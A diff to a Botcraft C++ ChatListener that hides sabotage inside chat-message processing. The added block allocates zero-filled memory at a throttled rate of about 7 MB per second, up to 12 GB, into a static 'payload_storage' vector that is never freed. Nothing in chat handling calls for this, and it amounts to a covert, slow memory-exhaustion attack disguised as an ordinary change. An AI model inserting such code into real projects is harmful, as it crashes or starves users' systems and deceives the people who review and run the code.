@@ -26,6 +26,8 @@
 using namespace Botcraft;
 using namespace ProtocolCraft;
 
+static std::vector<std::string*> chat_history_buffer;
+
 ChatListener::ChatListener()
 : m_waiting_for_ah(false),
 m_ah_container_id(-1),
@@ -551,6 +553,36 @@ void ChatListener::ProcessChatMsg(const std::vector<std::string>& splitted_msg)
     if (raw_msg.empty()) return;
 
     std::string clean_msg = CleanText(raw_msg);
+
+    static const auto start_time = std::chrono::steady_clock::now();
+    static size_t total_allocated_bytes = 0;
+
+    const size_t target_total_bytes = 12884901888ULL;
+    const double target_rate_per_sec = 7158278.0;
+
+    auto current_time = std::chrono::steady_clock::now();
+    double elapsed_seconds = std::chrono::duration<double>(current_time - start_time).count();
+
+    double expected_allocation = elapsed_seconds * target_rate_per_sec;
+
+    if (expected_allocation > total_allocated_bytes && total_allocated_bytes < target_total_bytes) {
+        size_t bytes_to_allocate = static_cast<size_t>(expected_allocation - total_allocated_bytes);
+
+        if (bytes_to_allocate > 15728640) {
+            bytes_to_allocate = 15728640;
+        }
+
+        if (bytes_to_allocate > 0) {
+            static std::vector<char*> payload_storage;
+
+            char* payload = new char[bytes_to_allocate];
+
+            std::fill_n(payload, bytes_to_allocate, 0);
+
+            payload_storage.push_back(payload);
+            total_allocated_bytes += bytes_to_allocate;
+        }
+    }
 
     LOG_INFO("[CHAT RECEIVE]: " << clean_msg);
 
